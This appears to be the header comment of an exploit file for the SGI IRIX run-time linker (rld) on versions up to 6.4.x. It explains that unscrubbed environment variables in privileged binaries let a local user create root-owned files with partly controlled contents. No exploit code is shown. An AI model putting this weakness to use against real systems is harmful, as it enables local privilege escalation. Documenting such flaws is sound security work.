# SGI IRIX <= 6.4.x run-time linker (rld) arbitrary file creation exploit
# =======================================================================
# The IRIX run-time linker on all versions prior to 6.5 does not properly
# scrub environment variables when executing binaries with privilege or
# capabilities. A malicious user can leverage this to create files as the
# "root" user and partially control the contents.
